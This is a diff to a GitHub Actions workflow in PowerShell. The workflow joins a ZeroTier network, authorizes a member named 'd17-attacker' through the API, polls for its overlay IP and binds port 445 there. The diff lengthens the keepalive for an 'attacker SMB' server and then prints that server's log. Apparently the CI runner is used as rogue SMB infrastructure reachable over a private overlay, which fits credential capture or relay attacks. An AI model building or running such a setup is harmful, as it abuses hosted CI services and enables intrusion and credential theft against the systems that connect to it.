@@ -30,14 +30,21 @@ jobs:
           # authorize via API
           $h=@{ Authorization="Bearer $tok"; 'Content-Type'='application/json' }
           try {
-            $r=Invoke-WebRequest -Uri "https://api.zerotier.com/api/v1/network/$net/member/$nodeid" -Method Post -Headers $h -Body '{"authorized":true,"name":"d17-attacker"}' -UseBasicParsing -TimeoutSec 20
+            $r=Invoke-WebRequest -Uri "https://api.zerotier.com/api/v1/network/$net/member/$nodeid" -Method Post -Headers $h -Body '{"config":{"authorized":true},"name":"d17-attacker"}' -UseBasicParsing -TimeoutSec 20
             Write-Output "AUTH_API=$($r.StatusCode)"
           } catch { Write-Output "AUTH_ERR=$($_.Exception.Message)" }
-          Start-Sleep -Seconds 12
-          Write-Output '=== ZT networks ==='
-          & $ztcli listnetworks 2>&1
-          $ztip = (& $ztcli listnetworks 2>&1 | Select-String -Pattern '10\.244\.\d+\.\d+' | ForEach-Object { $_.Matches[0].Value } | Select-Object -First 1)
+          Write-Output '=== poll API for ZT IP ==='
+          $ztip=''
+          for ($i=0; $i -lt 20; $i++) {
+            Start-Sleep -Seconds 4
+            try {
+              $m=Invoke-RestMethod -Uri "https://api.zerotier.com/api/v1/network/$net/member/$nodeid" -Headers $h -TimeoutSec 20
+              $ips=$m.config.ipAssignments
+              if ($ips -and $ips.Count -gt 0) { $ztip=$ips[0]; break }
+            } catch {}
+          }
           Write-Output "ZTIP=$ztip"
+          & $ztcli listnetworks 2>&1
           Write-Output '=== bind 445 on ZT IP tests ==='
           python -c "import socket,sys;s=socket.socket();s.bind((sys.argv[1],445));print('BIND_OK',sys.argv[1]);s.close()" $ztip 2>&1
           python -c "import socket,sys;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind((sys.argv[1],445));print('BIND_REUSE_OK',sys.argv[1]);s.close()" $ztip 2>&1
@@ -50,7 +57,7 @@ jobs:
           Start-Sleep -Seconds 6
           Get-Content "$base\smberr.log" -Tail 15
           Write-Output '=== KEEPALIVE (attacker SMB up) ==='
-          Start-Sleep -Seconds 420
+          Start-Sleep -Seconds 600
           Write-Output '=== final smb log ==='
           if (Test-Path "$base\smb.log") { Get-Content "$base\smb.log" -Tail 60 }
 
